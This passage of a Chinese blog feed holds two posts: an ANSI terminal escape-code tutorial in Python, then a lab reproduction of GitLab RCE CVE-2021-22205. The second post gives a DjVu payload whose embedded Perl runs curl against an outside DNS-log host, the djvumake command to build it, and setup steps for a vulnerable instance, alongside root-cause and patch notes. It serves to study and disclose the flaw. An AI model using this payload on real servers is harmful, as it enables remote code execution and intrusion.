class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>        code = <span class="hljs-built_in">str</span>(i * <span class="hljs-number">16</span> + j)<br>        sys.stdout.write(<span class="hljs-string">u&quot;\u001b[38;5;&quot;</span> + code + <span class="hljs-string">&quot;m &quot;</span> + code.ljust(<span class="hljs-number">4</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">u&quot;\u001b[0m&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/yEhP3Ulj5ZrzpWo.png" alt="image-20230104234048257"></p><p>我们此处使用<code>sys.stdout.write</code>而不是<code>print</code>，这样我们可以在一行上打印多个</p><h3 id="背景颜色">背景颜色</h3><p><code>ANSI转义码</code>还支持你设置对应的文本背景颜色，和设置字体颜色一样，其重置的方式代码仍然是<code>\u001b[0m]</code></p><ul><li>背景黑色：<code>\u001b[40m</code></li><li>背景红色：<code>\u001b[41m</code></li><li>背景绿色：<code>\u001b[42m</code></li><li>背景黄色：<code>\u001b[43m</code></li><li>背景蓝色：<code>\u001b[44m</code></li><li>背景洋红色：<code>\u001b[45m</code></li><li>背景青色：<code>\u001b[46m</code></li><li>背景白色：<code>\u001b[47m</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>, <span class="hljs-number">48</span>):<br>    sys.stdout.write(<span class="hljs-string">&quot;\u001b[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;m&quot;</span>+<span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">u&quot;\u001b[0m&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/XajNnA8mopDeB2y.png" alt="image-20230104235121754"></p><p>亮色版本：</p><ul><li>背景亮黑色：<code>\u001b[40;1m</code></li><li>背景亮红色：<code>\u001b[41;1m</code></li><li>背景亮绿色：<code>\u001b[42;1m</code></li><li>背景亮黄色：<code>\u001b[43;1m</code></li><li>背景亮蓝色：<code>\u001b[44;1m</code></li><li>背景明亮洋红色：<code>\u001b[45;1m</code></li><li>背景亮青色：<code>\u001b[46;1m</code></li><li>背景亮白色：<code>\u001b[47;1m</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>, <span class="hljs-number">48</span>):<br>    sys.stdout.write(<span class="hljs-string">u&quot;\u001b[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;m&quot;</span>+<span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">u&quot;\u001b[0m&quot;</span>)<br></code></pre></td></tr></table></figure><p>对于 256 颜色也是一样的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>        code = <span class="hljs-built_in">str</span>(i * <span class="hljs-number">16</span> + j)<br>        sys.stdout.write(<span class="hljs-string">&quot;\u001b[48;5;&quot;</span> + code + <span class="hljs-string">&quot;m &quot;</span> + code.ljust(<span class="hljs-number">4</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\u001b[0m&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/acHMCVNkPvElL3p.png" alt="image-20230104235619983"></p><h3 id="修饰">修饰</h3><p>除了字体颜色以及背景可以提供修改，我们还可以加入粗体，下划线，反转等修饰</p><ul><li>粗体：<code>\u001b[1m</code></li><li>下划线：<code>\u001b[4m</code> (好像VSC控制台会吃掉这个下划线，但是控制台不会)</li><li>反转：<code>\u001b[7m</code></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\u001b[1m BOLD \u001b[0m\u001b[4m Underline \u001b[0m\u001b[7m Reversed \u001b[0m&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/a5VWwdTbErNmJnG.png" alt="image-20230104235902453"></p><p>这几个也可以一起搭配前面所提到的修改字符颜色以及背景一起使用，此处就不再赘述</p><h2 id="光标控制">光标控制</h2><p>顾名思义，我们可以使用<code>ANSI转义码</code>来控制光标的位置，以此来达到模仿输入的操作</p><p>其中基本的为：<code>上下左右</code>控制</p><ul><li>向上：<code>\u001b[&#123;n&#125;A</code></li><li>向下：<code>\u001b[&#123;n&#125;B</code></li><li>向右：<code>\u001b[&#123;n&#125;C</code></li><li>向左：<code>\u001b[&#123;n&#125;D</code></li></ul><p>其中<code>&#123;n&#125;</code>在使用过程中我们需要将其替换为对应的数字，代表我们想要移动的长度</p><blockquote><p>需要注意的是，当我们的光标向左移动了 n 个后再进行输出时，会将后面的内容进行覆盖</p></blockquote><p>在输出时，会先解析对应的ANSI转义码，将光标进行移动，之后在进行输出，借助这个特性我们可以写一个进度显示器，而不需要使用类似<code>tqdm</code>的库</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> time, sys<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loading</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Loading...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        sys.stdout.write(<span class="hljs-string">u&quot;\u001b[3D&quot;</span> + <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;%&quot;</span>) <span class="hljs-comment"># 3 可以是大于它的数字，我们仅仅只是需要将其移动到最前面将输出覆盖即可</span><br>        sys.stdout.flush()<br>    <span class="hljs-built_in">print</span>()<br>    <br>loading()<br></code></pre></td></tr></table></figure><p>或者是类似加载条的形式：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> time, sys<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loading</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Loading...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        width = (i + <span class="hljs-number">1</span>) / <span class="hljs-number">4</span><br>        bar = <span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-string">&quot;#&quot;</span> * width + <span class="hljs-string">&quot; &quot;</span> * (<span class="hljs-number">25</span> - width) + <span class="hljs-string">&quot;]&quot;</span><br>        sys.stdout.write(<span class="hljs-string">&quot;\u001b[1000D&quot;</span> +  bar)<br>        sys.stdout.flush()<br>    <span class="hljs-built_in">print</span>()<br>    <br>loading()<br></code></pre></td></tr></table></figure><p>以上的进度条都没有任何的监控进度的完成，但是我们可以加入对应的监控项目，然后降至转化为真正的进度监控，或者结合上面提到的字体颜色以及背景的更改来设计更为花哨的进度条</p><p>对于下一行的操作<code>ANSI转义码</code>也提供了一些方法：</p><ul><li>下一行：将光标向下移动到行首<code>\u001b[&#123;n&#125;E</code></li><li>上一行：将光标向下移动到行首<code>\u001b[&#123;n&#125;F</code></li></ul><p>同时其也允许我们保存对应位置数据：</p><ul><li>保存位置：保存当前光标位置<code>\u001b[&#123;s&#125;</code></li><li>保存位置：将光标恢复到上次保存的位置<code>\u001b[&#123;u&#125;</code></li></ul><h2 id="编写命令行">编写命令行</h2><p><code>ANSI转义</code>码的主要目的就是实现命令行，我们可以根据用户的输入来产生对应的输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys, tty<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">command_line</span>():</span><br>    tty.setraw(sys.stdin) <span class="hljs-comment"># 将我们的命令行设置成raw模式，避免shell帮我们解析方向键、回退键(Backspace)以及用户输入进行缓冲</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>: <br>        <span class="hljs-built_in">input</span> = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>: <span class="hljs-comment"># 循环来控制每一个字符</span><br>            char = <span class="hljs-built_in">ord</span>(sys.stdin.read(<span class="hljs-number">1</span>)) <span class="hljs-comment"># 每次只读入一个字符</span><br>            <br>            <span class="hljs-keyword">if</span> char == <span class="hljs-number">3</span>: <span class="hljs-comment"># CTRL-C</span><br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-number">32</span> &lt;= char &lt;= <span class="hljs-number">126</span>: <span class="hljs-comment"># 普通字符</span><br>                <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span> + <span class="hljs-built_in">chr</span>(char)<br>            <span class="hljs-keyword">elif</span> char <span class="hljs-keyword">in</span> &#123;<span class="hljs-number">10</span>, <span class="hljs-number">13</span>&#125;: <span class="hljs-comment"># 如果是回车时</span><br>                sys.stdout.write(<span class="hljs-string">&quot;\u001b[1000D&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\necho something ... &quot;</span>, <span class="hljs-built_in">input</span>)<br>                <span class="hljs-built_in">input</span> = <span class="hljs-string">&quot;&quot;</span><br>                <br>            sys.stdout.write(<span class="hljs-string">&quot;\u001b[1000D&quot;</span>)  <span class="hljs-comment"># 光标移动到最左侧</span><br>            sys.stdout.write(<span class="hljs-built_in">input</span>) <span class="hljs-comment"># 重新输出 input</span><br>            sys.stdout.flush()<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是上述代码中导入了<code>tty</code>库，我们使用这个库的时候需要有<code>termios</code>库，此库仅适用于<code>Unix</code>，因此上述代码在<code>Windows端</code>无法执行</p></blockquote><p>因为我们采用了<code>raw</code>模式，不移动光标照顾护额打印会出现光标不会移动到行首的问题，我们我们再次输出一个<code>\u001b[1000D</code>确保其回到开头</p><h3 id="删除">删除</h3><p>但是我们想要实现删除时，我们采用覆写的方式在某种意义上也算是完成了我们的需要，但是假如我们需要删掉一个字符呢？我们覆写模式还是需要将字符串后面的内容再次进行输出，稍微有点麻烦，对此<code>ANSI转义码</code>也提供了删除这一操作</p><ul><li><p>清除屏幕：清除屏幕</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">\u001b[</span><span class="hljs-template-variable">&#123;n&#125;</span><span class="xml">J</span><br></code></pre></td></tr></table></figure><ul><li><code>n=0</code>从光标中清除，直到屏幕结束，</li><li><code>n=1</code>从光标清除到屏幕开头</li><li><code>n=2</code>清除整个屏幕</li></ul></li><li><p>清除行：清除当前行</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">\u001b[</span><span class="hljs-template-variable">&#123;n&#125;</span><span class="xml">K</span><br></code></pre></td></tr></table></figure><ul><li><code>n=0</code>从光标清除到行尾</li><li><code>n=1</code>从光标清除到行首</li><li><code>n=2</code>清除整行</li></ul></li></ul><h2 id="总结">总结</h2><p>我们简答的了解了一下<code>ANSI转义码</code>的使用，对于更多的指令大家可以参考下面的表格</p><table><thead><tr><th>name</th><th>signature</th><th>description</th><th></th></tr></thead><tbody><tr><td>A</td><td>Cursor Up</td><td>(n=1)</td><td>Move cursor up by n 【将光标向上移动n行】</td></tr><tr><td>B</td><td>Cursor Down</td><td>(n=1)</td><td>Move cursor down by n 【将光标向下移动n行】</td></tr><tr><td>C</td><td>Cursor Forward</td><td>(n=1)</td><td>Move cursor forward by n 【将光标向前移动n个字符】</td></tr><tr><td>D</td><td>Cursor Back</td><td>(n=1)</td><td>Move cursor back by n 【将光标向后移动n个字符】</td></tr><tr><td>E</td><td>Cursor Next Line</td><td>(n=1)</td><td>Move cursor to the beginning of the line n lines down【将光标向下移到到n行的行首】</td></tr><tr><td>F</td><td>Cursor Previous Line</td><td>(n=1)</td><td>Move cursor to the beginning of the line n lines up【将光标向上移到到n行的行首】</td></tr><tr><td>G</td><td>Cursor Horizontal Absolute</td><td>(n=1)</td><td>Move cursor to the the column nwithin the current row 【将光标移动到当前行中的第n列】</td></tr><tr><td>H</td><td>Cursor Position</td><td>(n=1, m=1)</td><td>Move cursor to row n, column m, counting from the top left corner</td></tr><tr><td>J</td><td>Erase in Display</td><td>(n=0)</td><td>Clear part of the screen. 0, 1, 2, and 3 have various specific functions</td></tr><tr><td>K</td><td>Erase in Line</td><td>(n=0)</td><td>Clear part of the line. 0, 1, and 2 have various specific functions</td></tr><tr><td>S</td><td>Scroll Up</td><td>(n=1)</td><td>Scroll window up by n lines 【将窗口向上滚动到n行】</td></tr><tr><td>T</td><td>Scroll Down</td><td>(n=1)</td><td>Scroll window down by n lines 【将窗口向下滚动到n行】</td></tr><tr><td>s</td><td>Save Cursor Position</td><td>()</td><td>Save current cursor position for use with u</td></tr><tr><td>u</td><td>Restore Cursor Position</td><td>()</td><td>Set cursor back to position last saved by s</td></tr><tr><td>f</td><td>…</td><td>…</td><td>(same as G)</td></tr><tr><td>m</td><td>SGR</td><td>(*)</td><td>Set graphics mode. More below【见下一个表格】</td></tr></tbody></table><p>关于SGR的作用我们在下面一个表格进行简单说明：</p><table><thead><tr><th>value</th><th>name / description</th></tr></thead><tbody><tr><td>0</td><td>Reset: turn off all attributes 【重置：关闭所有属性】</td></tr><tr><td>1</td><td>Bold (or bright, it’s up to the terminal and the user config to some extent) 【粗体】</td></tr><tr><td>3</td><td>Italic 【斜体】</td></tr><tr><td>4</td><td>Underline 【下划线】</td></tr><tr><td>30–37</td><td>Set text colour from the basic colour palette of 0–7 【从0-7的基本颜色板中设置文本颜色,即前景色】</td></tr><tr><td>38;5;n</td><td>Set text colour to index n in a 256-colour palette(e.g. \x1b[38;5;34m)【前景色】</td></tr><tr><td>38;2;r;g;b</td><td>Set text colour to an RGB value (e.g. \x1b[38;2;255;255;0m)【前景色】</td></tr><tr><td>40–47</td><td>Set background colour 【从0-7的基本颜色板中设置背景色】</td></tr><tr><td>48;5;n</td><td>Set background colour to index n in a 256-colour palette 【背景色】</td></tr><tr><td>48;2;r;g;b</td><td>Set background colour to an RGB value 【背景色】</td></tr><tr><td>90–97</td><td>Set text colour from the bright colour palette of 0–7</td></tr><tr><td>100–107</td><td>Set background colour from the bright colour palette of 0–7</td></tr></tbody></table><p>其中有些没有列出来，感兴趣可以自己去看看<code>Wiki</code></p><p>我们可以通过<code>ANSI转义码</code>来实现<code>Shell</code>端的游戏、命令行、Vim等功能，更多的小玩意可以靠大家的想象去实现与完成</p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GitLab 远程命令执行漏洞复现(CVE-2021-22205)</title>
    <link href="/2022/12/14/GitLab%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/"/>
    <url>/2022/12/14/GitLab%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述">漏洞描述</h2><p>GitLab 没有正确验证传递给文件解析器的图像文件，这导致远程命令执行，可执行系统命令。这是一个严重的问题。它现在在最新版本中得到缓解，漏洞编号CVE-2021-22205。</p><h2 id="影响范围">影响范围</h2><p>以下版本范围内的 GitLab（CE/EE）受到漏洞影响：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">11</span>.<span class="hljs-number">9</span> &lt;=  GitLab（CE/EE）&lt; <span class="hljs-number">13</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">13</span>.<span class="hljs-number">9</span> &lt;=  GitLab（CE/EE）&lt; <span class="hljs-number">13</span>.<span class="hljs-number">9</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">13</span>.<span class="hljs-number">10</span> &lt;= GitLab（CE/EE）&lt; <span class="hljs-number">13</span>.<span class="hljs-number">10</span>.<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="环境搭建">环境搭建</h2><h3 id="获取镜像">获取镜像</h3><p>我们找到在影响范围内的<code>Gitlab</code>包，对其进行下载，我们此处采用<code>Kali Linux</code>进行攻击</p><p>我们需要首先搭建<code>Docker</code>环境，使用<code>pull</code>对<code>Docker Hub</code>上的<code>Kali</code>镜像进行拉取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull kalilinux/kali-rolling<br></code></pre></td></tr></table></figure><p>在下载完后我们可以得到一个什么工具都没有的纯净版本的<code>Kali</code>，接下来就是换源、下载工具等操作了</p><h3 id="换源与工具安装">换源与工具安装</h3><p>因为我们刚下载完一个纯净版<code>Kali</code>，系统是肯定没有<code>vim</code>编辑器的，我们先对其一些工具进行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update <span class="hljs-comment"># 更新源</span><br>apt-get upgrade <span class="hljs-comment"># 更新已安装的包</span><br>apt-get install vim<br>apt-get install git<br>apt-get install python<br>apt-get install net-tools<br></code></pre></td></tr></table></figure><blockquote><p>此处可能会出现一些问题，当我们安装<code>Python</code>时，它可能会提示你已经安装有<code>Python2</code>，此时我们在<code>Python</code>后加一个<code>3</code>变成<code>apt-get install python3</code>即可</p></blockquote><p>在下载完成后我们使用<code>Vim</code>对系统的源进行修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/apt/sources.list<br></code></pre></td></tr></table></figure><p>之后我们在里面添加以下源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># kali官方源</span><br>deb http:<span class="hljs-regexp">//</span>http.kali.org/kali kali-rolling main non-free contrib<br><span class="hljs-comment"># 中科大的源</span><br>deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib<br></code></pre></td></tr></table></figure><p>完成之后我们需要安装Kali的工具包：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">apt-<span class="hljs-keyword">get</span> install kali-linux-<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><blockquote><p>新版本中可能需要将<code>kali-linux-all</code>替换为<code>kali-linux-everything</code></p></blockquote><h3 id="GITLAB获取-Win">GITLAB获取-Win</h3><p>因为相关的版本的<code>GitLab</code>环境较难寻找，此处使用<code>Windows</code>本地的<code>Docker</code>进行搭建</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub.git<br>cd vulhub<span class="hljs-regexp">/gitlab/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">22205</span>/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>在执行完后我们可以进行访问相应端口，会出现如下界面:</p><p><img src="https://s2.loli.net/2022/12/14/rnwXZTVt1cA3e6m.png" alt=""></p><h3 id="GitLab获取-CentOS">GitLab获取-CentOS</h3><p>首先我们需要安装 ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo yum install -y curl policycoreutils-python openssh-server<br></code></pre></td></tr></table></figure><p>并将其设置开机自启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> sshd  <br></code></pre></td></tr></table></figure><p>启动ssh服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl start sshd<br></code></pre></td></tr></table></figure><p>我们找到对应的源，进行下载安装即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加gitlab镜像</span><br>wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-12.10.6-ce.0.el7.x86_64.rpm<br><span class="hljs-comment"># 安装gitlab</span><br>rpm -i gitlab-ce-12.10.6-ce.0.el7.x86_64.rpm<br></code></pre></td></tr></table></figure><p>安装成功后出现如下图</p><p><img src="https://s2.loli.net/2022/12/15/GCFBjhJLyc7eRQd.png" alt=""></p><p>此时我们便安装成功了，在<code>Linux</code>上安装完成</p><p>我们修改其配置文件，将其部署到本地<code>localhost</code>上</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim  <span class="hljs-regexp">/etc/gi</span>tlab/gitlab.rb<br></code></pre></td></tr></table></figure><p>将第六行中的<code>external_url</code>进行修改并保存</p><p>之后我们执行以下命令，将<code>gitlab</code>更新并重启</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">gitlab-ctl reconfigure</span><br><span class="hljs-attribute">gitlab-ctl restart</span> <br></code></pre></td></tr></table></figure><p>我们便可以见到和<code>Win</code>上一样的界面了</p><h2 id="尝试攻击">尝试攻击</h2><h3 id="现成脚本">现成脚本</h3><p>下载地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Al1ex/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">22205</span><br></code></pre></td></tr></table></figure><p>我们将其<code>git</code>克隆到本地，因为命令执行无回显，可以使用<code>DNS</code>解析来进行判断是否有对其的网页解析</p><h4 id="漏洞检测">漏洞检测</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">22205</span>.py -v true -t http://XXX.XXX.XXX.XXX:<span class="hljs-number">8080</span>/<br></code></pre></td></tr></table></figure><h3 id="手动复现">手动复现</h3><p>我们此处启动对应的服务项，注册一个新用户，登录之后的界面如下</p><p><img src="https://s2.loli.net/2022/12/15/cRDpQvuyLoHP8Jj.png" alt=""></p><p>我们在个人主页里找到<code>Snippets</code>，新建一个</p><p><img src="https://s2.loli.net/2022/12/15/OuG9ia6pVmZy7Wr.png" alt=""></p><p>之后出现如下界面：</p><p><img src="https://s2.loli.net/2022/12/15/cEJ8MAanVFoSv9q.png" alt=""></p><p>箭头所指的方向即为我们要上传<code>DjVu</code>格式的图片，即<code>EXP</code></p><blockquote><p>注意一下，上传到<code>GitLab</code>的图片格式任然要求是<code>.jpg</code>，不要修改为了<code>.djvu</code></p></blockquote><h4 id="DjVu-格式图片制作">DjVu 格式图片制作</h4><p>下载安装<code>DjVuLibre</code>地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>djvu.sourceforge.net/<br></code></pre></td></tr></table></figure><p>准备好将要压缩图片的文本</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">(metadata<br>(Copyright <span class="hljs-string">&quot;\</span><br><span class="hljs-string">&quot;</span> . <span class="hljs-string">qx&#123;curl cc.v2pzjb.dnslog.cn&#125;</span> . \<br><span class="hljs-string">&quot; b &quot;</span>) )<br></code></pre></td></tr></table></figure><p>生成 EXP</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">djvumake rce.djvu <span class="hljs-attribute">INFO</span>=0,0 <span class="hljs-attribute">BGjp</span>=/dev/null <span class="hljs-attribute">ANTa</span>=rce.txt &amp;&amp; mv rce.djvu rce.jpg<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/15/8aQxOEC7LdS5vkD.png" alt=""></p><p>我们将其进行上传<br>我们可以看到如下：</p><p><img src="https://s2.loli.net/2022/12/15/VnIiYrs4ZwdFjGL.png" alt=""></p><p>此时我们的攻击已经完成，证明该漏洞的存在</p><p>在授权的情况下，我们可以直接通过BP对发送的请求包进行抓取，然后修改请求，进而实现对应的远程代码执行</p><img src="https://s2.loli.net/2022/12/16/Qz8mkVbsO1hxSl4.png" alt="" style="zoom:50%;" /><p>我们也便不用再次生成对应的<code>DjVu</code>格式文件，可以直接修改传递参数来重复发包，达到攻击目的</p><img src="https://s2.loli.net/2022/12/16/BJCykO9W1uL36zc.png" alt="" style="zoom:50%;" /><h2 id="修复建议">修复建议</h2><p>当<code>GitLab</code>中的<code>ExifTool</code>处理图像文件时，会检查文件扩展名是否为<code>jpg</code>、<code>jpeg</code>、<code>tiff</code>，符合条件的文件会交由<code>ExifTool</code>进行处理。但<code>ExifTool</code>会尝试通过文件内容确定文件格式，当其解析<code>DjVu</code>文件注释时，<code>tok</code>将被转换为 C 转义序列。攻击者可以在<code>DjVu</code>文件中插入恶意<code>perl</code>代码，并将其扩展名改为<code>jpg</code>、<code>jpeg</code>或<code>tiffd</code>以绕过<code>GitLab</code>中的检查，从而在<code>ExifTool</code>中触发漏洞，最终在<code>GitLab CE/EE</code>服务器上远程执行代码。</p><p>此漏洞源于<code>Exiftool</code>自身的另一个漏洞<code>CVE-2021-22204</code>。</p><p>所以本质上需要修复的是<code>Exiftool</code>的转换方式，在新版本中我们可以看到更新后采用了硬编码的形式去搜索和替换，来对 C 转义字符进行处理，同时删除<code>eval</code>函数，进而修复该漏洞。</p><p>则对于我们GitLab平台则是更新到影响范围外的版本即可。</p><h2 id="参考链接">参考链接</h2><p><a href="https://www.freebuf.com/articles/web/303375.html">GitLab 远程命令执行漏洞复现(CVE-2021-22205) - FreeBuf网络安全行业门户</a></p><p><a href="https://cloud.tencent.com/developer/article/2101590">CVE-2021-22205 GitLab未授权RCE复现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">ExifTool CVE-2021-22204 - Arbitrary Code Execution | 